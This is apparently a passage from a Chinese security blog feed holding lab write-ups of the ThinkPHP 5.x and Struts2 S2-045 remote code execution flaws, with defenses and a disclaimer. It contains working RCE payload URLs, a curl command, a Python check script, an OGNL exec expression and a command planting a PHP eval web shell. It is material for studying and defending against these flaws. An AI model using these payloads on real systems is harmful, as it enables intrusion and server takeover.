&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=ls%20/&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;查看网络配置：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=ifconfig&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3-使用-Curl-测试&#34;&gt;&lt;a href=&#34;#3-使用-Curl-测试&#34; class=&#34;headerlink&#34; title=&#34;3. 使用 Curl 测试&#34;&gt;&lt;/a&gt;3. 使用 Curl 测试&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;curl &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=whoami&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;注意：URL 中的 &lt;code&gt;\&lt;/code&gt; 要写成 &lt;code&gt;\\&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;4-使用-Burp-Suite-测试&#34;&gt;&lt;a href=&#34;#4-使用-Burp-Suite-测试&#34; class=&#34;headerlink&#34; title=&#34;4. 使用 Burp Suite 测试&#34;&gt;&lt;/a&gt;4. 使用 Burp Suite 测试&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;在浏览器中访问目标页面，拦截请求&lt;/li&gt;
&lt;li&gt;将 Payload 粘贴进 Repeater 中测试&lt;/li&gt;
&lt;li&gt;修改 &lt;code&gt;vars[1][]&lt;/code&gt; 的值如 &lt;code&gt;id&lt;/code&gt;、&lt;code&gt;ls&lt;/code&gt; 等&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;五、Payload-结构总结&#34;&gt;&lt;a href=&#34;#五、Payload-结构总结&#34; class=&#34;headerlink&#34; title=&#34;五、Payload 结构总结&#34;&gt;&lt;/a&gt;五、Payload 结构总结&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数键&lt;/th&gt;
&lt;th&gt;功能说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;s&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;请求路由，指向 ThinkPHP 核心类&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;function&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;要调用的 PHP 函数（如 &lt;code&gt;call_user_func_array&lt;/code&gt;）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;vars[0]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;执行的函数名称（如 &lt;code&gt;phpinfo&lt;/code&gt;, &lt;code&gt;system&lt;/code&gt;）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;vars[1][]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;函数的参数数组（如 &lt;code&gt;whoami&lt;/code&gt;, &lt;code&gt;id&lt;/code&gt;）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;hr&gt;
&lt;h2 id=&#34;六、防御措施&#34;&gt;&lt;a href=&#34;#六、防御措施&#34; class=&#34;headerlink&#34; title=&#34;六、防御措施&#34;&gt;&lt;/a&gt;六、防御措施&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;升级 ThinkPHP 版本&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;升级至 ThinkPHP 5.0.24 或更高版本。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;输入验证与过滤&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;白名单验证 &lt;code&gt;s&lt;/code&gt; 参数&lt;/li&gt;
&lt;li&gt;禁用危险函数如 &lt;code&gt;call_user_func_array&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;严格过滤所有用户输入参数&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;禁用危险函数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;php.ini&lt;/code&gt; 中：&lt;/p&gt;
&lt;figure class=&#34;highlight mel&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs mel&#34;&gt;disable_functions = &lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;,&lt;span class=&#34;hljs-keyword&#34;&gt;exec&lt;/span&gt;,&lt;span class=&#34;hljs-keyword&#34;&gt;system&lt;/span&gt;,passthru,shell_exec,proc_open,call_user_func_array&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;最小权限原则&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Web 服务运行用户不要使用 &lt;code&gt;root&lt;/code&gt;，限制文件访问权限。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;部署 WAF&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;拦截请求中包含敏感函数或路径的攻击尝试。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;安全审计与监控&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;定期扫描、日志审计，发现异常行为。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;七、笔记总结&#34;&gt;&lt;a href=&#34;#七、笔记总结&#34; class=&#34;headerlink&#34; title=&#34;七、笔记总结&#34;&gt;&lt;/a&gt;七、笔记总结&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;内容项&lt;/th&gt;
&lt;th&gt;信息&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;漏洞类型&lt;/td&gt;
&lt;td&gt;RCE（远程代码执行）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;影响版本&lt;/td&gt;
&lt;td&gt;ThinkPHP 5.0.x 至 5.0.23&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;漏洞原因&lt;/td&gt;
&lt;td&gt;动态函数调用缺乏授权校验&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;复现方式&lt;/td&gt;
&lt;td&gt;URL GET 请求构造 Payload&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;环境工具&lt;/td&gt;
&lt;td&gt;Vulhub、Docker、Kali Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;hr&gt;
&lt;h2 id=&#34;八、附加玩法&#34;&gt;&lt;a href=&#34;#八、附加玩法&#34; class=&#34;headerlink&#34; title=&#34;八、附加玩法&#34;&gt;&lt;/a&gt;八、附加玩法&lt;/h2&gt;&lt;h3 id=&#34;自动化检测脚本&#34;&gt;&lt;a href=&#34;#自动化检测脚本&#34; class=&#34;headerlink&#34; title=&#34;自动化检测脚本&#34;&gt;&lt;/a&gt;自动化检测脚本&lt;/h3&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; requests&lt;br&gt;&lt;br&gt;url = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=whoami&amp;quot;&lt;/span&gt;&lt;br&gt;response = requests.get(url)&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;www-data&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; response.text:&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Vulnerability found!&amp;quot;&lt;/span&gt;)&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;No vulnerability detected.&amp;quot;&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;上传-WebShell&#34;&gt;&lt;a href=&#34;#上传-WebShell&#34; class=&#34;headerlink&#34; title=&#34;上传 WebShell&#34;&gt;&lt;/a&gt;上传 WebShell&lt;/h3&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=echo%20%27%3C%3Fphp%20%40eval%28%24_POST%5B%27pass%27%5D%29%3B%20%3F%3E%27%20%3E%20/var/www/html/shell.php&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;使用蚁剑连接：&lt;/p&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;http:&lt;span class=&#34;hljs-comment&#34;&gt;//192.168.56.102:8080/shell.php&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;提权尝试&#34;&gt;&lt;a href=&#34;#提权尝试&#34; class=&#34;headerlink&#34; title=&#34;提权尝试&#34;&gt;&lt;/a&gt;提权尝试&lt;/h3&gt;&lt;p&gt;结合弱口令、提权漏洞等，可使用 Metasploit 等工具进一步入侵。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;九、总结&#34;&gt;&lt;a href=&#34;#九、总结&#34; class=&#34;headerlink&#34; title=&#34;九、总结&#34;&gt;&lt;/a&gt;九、总结&lt;/h2&gt;&lt;p&gt;ThinkPHP 5.x RCE 漏洞是一个典型的动态函数调用漏洞，利用简单但危害极大。通过 Vulhub 靶场，我们可以快速复现漏洞，深入理解其原理和利用方式。&lt;/p&gt;
&lt;p&gt;开发者应及时升级框架版本，实施严格的输入验证和权限控制，部署 WAF 和监控机制，以降低漏洞被利用的风险。&lt;/p&gt;
&lt;p&gt;希望本文能帮助读者更好地理解和防范 ThinkPHP RCE 漏洞，同时提升 Web 应用安全开发的意识！&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;⚠️-免责声明&#34;&gt;&lt;a href=&#34;#⚠️-免责声明&#34; class=&#34;headerlink&#34; title=&#34;⚠️ 免责声明&#34;&gt;&lt;/a&gt;⚠️ 免责声明&lt;/h2&gt;&lt;p&gt;本文内容仅供网络安全学习和研究使用，请勿用于非法用途。任何个人或组织使用本文信息进行的违法活动，均与作者无关。读者应当遵守当地法律法规，在合法授权的环境下进行安全测试。&lt;/p&gt;
</content>
        <category term="Web安全" />
        <category term="RCE" />
        <category term="漏洞复现" />
        <category term="ThinkPHP" />
        <updated>2025-07-27T09:25:25.000Z</updated>
    </entry>
    <entry>
        <id>https://bae-ace.github.io/2025/07/24/Struts2-045-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/</id>
        <title>Struts2-045远程代码执行漏洞复现与原理分析</title>
        <link rel="alternate" href="https://bae-ace.github.io/2025/07/24/Struts2-045-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
        <content type="html">&lt;h1 id=&#34;Struts2-045远程代码执行漏洞复现与原理分析&#34;&gt;&lt;a href=&#34;#Struts2-045远程代码执行漏洞复现与原理分析&#34; class=&#34;headerlink&#34; title=&#34;Struts2-045远程代码执行漏洞复现与原理分析&#34;&gt;&lt;/a&gt;Struts2-045远程代码执行漏洞复现与原理分析&lt;/h1&gt;&lt;h2 id=&#34;漏洞概述&#34;&gt;&lt;a href=&#34;#漏洞概述&#34; class=&#34;headerlink&#34; title=&#34;漏洞概述&#34;&gt;&lt;/a&gt;漏洞概述&lt;/h2&gt;&lt;p&gt;Struts2-045（CVE-2017-5638）是Apache Struts2框架中的一个严重远程代码执行漏洞，该漏洞因其影响范围广、利用简单而备受关注。攻击者可以通过构造恶意的Content-Type请求头，在目标服务器上执行任意系统命令。&lt;/p&gt;
&lt;h2 id=&#34;漏洞基本信息&#34;&gt;&lt;a href=&#34;#漏洞基本信息&#34; class=&#34;headerlink&#34; title=&#34;漏洞基本信息&#34;&gt;&lt;/a&gt;漏洞基本信息&lt;/h2&gt;&lt;h3 id=&#34;影响版本&#34;&gt;&lt;a href=&#34;#影响版本&#34; class=&#34;headerlink&#34; title=&#34;影响版本&#34;&gt;&lt;/a&gt;影响版本&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Apache Struts 2.3.5 - 2.3.31&lt;/strong&gt;（包含2.3.31版本）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Apache Struts 2.5.0 - 2.5.10&lt;/strong&gt;（包含2.5.10版本）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;漏洞等级&#34;&gt;&lt;a href=&#34;#漏洞等级&#34; class=&#34;headerlink&#34; title=&#34;漏洞等级&#34;&gt;&lt;/a&gt;漏洞等级&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;CVSS评分&lt;/strong&gt;: 10.0（严重）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;漏洞类型&lt;/strong&gt;: 远程代码执行（RCE）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;攻击复杂度&lt;/strong&gt;: 低&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;核心原理&#34;&gt;&lt;a href=&#34;#核心原理&#34; class=&#34;headerlink&#34; title=&#34;核心原理&#34;&gt;&lt;/a&gt;核心原理&lt;/h3&gt;&lt;p&gt;Struts2框架在处理文件上传请求时，会解析Content-Type请求头。当Content-Type格式不正确时，框架会抛出异常，而&lt;strong&gt;异常处理过程中会对错误信息进行OGNL表达式解析&lt;/strong&gt;，这就给了攻击者可乘之机。&lt;/p&gt;
&lt;h2 id=&#34;技术原理深度分析&#34;&gt;&lt;a href=&#34;#技术原理深度分析&#34; class=&#34;headerlink&#34; title=&#34;技术原理深度分析&#34;&gt;&lt;/a&gt;技术原理深度分析&lt;/h2&gt;&lt;h3 id=&#34;OGNL表达式注入机制&#34;&gt;&lt;a href=&#34;#OGNL表达式注入机制&#34; class=&#34;headerlink&#34; title=&#34;OGNL表达式注入机制&#34;&gt;&lt;/a&gt;OGNL表达式注入机制&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;OGNL（Object-Graph Navigation Language）&lt;/strong&gt; 是Struts2框架使用的表达式语言，用于在Java对象之间进行导航和操作。&lt;/p&gt;
&lt;figure class=&#34;highlight stylus&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stylus&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// OGNL表达式示例&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-selector-id&#34;&gt;#context&lt;/span&gt;&lt;span class=&#34;hljs-selector-attr&#34;&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;xwork.MethodAccessor.denyMethodExecution&amp;#x27;&lt;/span&gt;]&lt;/span&gt; = false&lt;br&gt;@java&lt;span class=&#34;hljs-selector-class&#34;&gt;.lang&lt;/span&gt;.Runtime@&lt;span class=&#34;hljs-built_in&#34;&gt;getRuntime&lt;/span&gt;()&lt;span class=&#34;hljs-selector-class&#34;&gt;.exec&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;whoami&amp;#x27;&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;漏洞触发流程&#34;&gt;&lt;a href=&#34;#漏洞触发流程&#34; class=&#34;headerlink&#34; title=&#34;漏洞触发流程&#34;&gt;&lt;/a&gt;漏洞触发流程&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;请求接收&lt;/strong&gt;: 服务器接收包含恶意Content-Type的HTTP请求&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;类型解析&lt;/strong&gt;: Struts2尝试解析Content-Type头部信息&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;异常触发&lt;/strong&gt;: 恶意构造的Content-Type导致解析异常&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;错误处理&lt;/strong&gt;: 异常处理器对错误信息进行OGNL解析&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;代码执行&lt;/strong&gt;: 恶意OGNL表达式被执行，实现RCE&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;关键源码分析&#34;&gt;&lt;a href=&#34;#关键源码分析&#34; class=&#34;headerlink&#34; title=&#34;关键源码分析&#34;&gt;&lt;/a&gt;关键源码分析&lt;/h3&gt;&lt;p&gt;漏洞位于&lt;code&gt;org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest&lt;/code&gt;类中：&lt;/p&gt;
&lt;figure class=&#34;highlight typescript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs typescript&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 简化的漏洞代码逻辑&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;buildErrorMessage&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-title class_&#34;&gt;Throwable&lt;/span&gt; e, &lt;span class=&#34;hljs-title class_&#34;&gt;Object&lt;/span&gt;[] args&lt;/span&gt;) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-title class_&#34;&gt;String&lt;/span&gt; errorMessage = localizedTextProvider.&lt;span class=&#34;hljs-title function_&#34;&gt;findDefaultText&lt;/span&gt;(e.&lt;span class=&#34;hljs-title function_&#34;&gt;getMessage&lt;/span&gt;(), locale, args);&lt;br&gt;    &lt;span class=&#34;hljs-comment&#34;&gt;// 这里会对errorMessage进行OGNL表达式解析，导致RCE&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (errorMessage != &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;) &amp;#123;&lt;br&gt;        errorMessage = &lt;span class=&#34;hljs-title class_&#34;&gt;TextParseUtil&lt;/span&gt;.&lt;span class=&#34;hljs-title function_&#34;&gt;translateVariables&lt;/span&gt;(errorMessage, stack);&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;实验环境搭建&#34;&gt;&lt;a href=&#34;#实验环境搭建&#34; class=&#34;headerlink&#34; title=&#34;实验环境搭建&#34;&gt;&lt;/a&gt;实验环境搭建&lt;/h2&gt;&lt;h3 id=&#34;系统架构&#34;&gt;&lt;a href=&#34;#系统架构&#34; class=&#34;headerlink&#34; title=&#34;系统架构&#34;&gt;&lt;/a&gt;系统架构&lt;/h3&gt;&lt;figure class=&#34;highlight nix&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs nix&#34;&gt;┌─ 攻击机（Host）&lt;br&gt;│  └─ Windows&lt;span class=&#34;hljs-symbol&#34;&gt;/Linux&lt;/span&gt; &lt;span class=&#34;hljs-operator&#34;&gt;+&lt;/span&gt; BurpSuite&lt;br&gt;│&lt;br&gt;└─ 靶机（Kali VM）&lt;br&gt;   ├─ &lt;span class=&#34;hljs-params&#34;&gt;IP:&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;56.102&lt;/span&gt;&lt;br&gt;   ├─ Docker &lt;span class=&#34;hljs-operator&#34;&gt;+&lt;/span&gt; Vulhub&lt;br&gt;   └─ Struts2 App (Port &lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;Docker环境部署&#34;&gt;&lt;a href=&#34;#Docker环境部署&#34; class=&#34;headerlink&#34; title=&#34;Docker环境部署&#34;&gt;&lt;/a&gt;Docker环境部署&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 1. 克隆Vulhub项目&lt;/span&gt;&lt;br&gt;git &lt;span class=&#34;hljs-built_in&#34;&gt;clone&lt;/span&gt; https://github.com/vulhub/vulhub.git&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 2. 进入S2-045目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;cd&lt;/span&gt; vulhub/struts2/s2-045&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 3. 启动靶场&lt;/span&gt;&lt;br&gt;docker-compose up -d&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 4. 验证容器状态&lt;/span&gt;&lt;br&gt;docker ps -a&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;预期输出&lt;/strong&gt;:&lt;/p&gt;
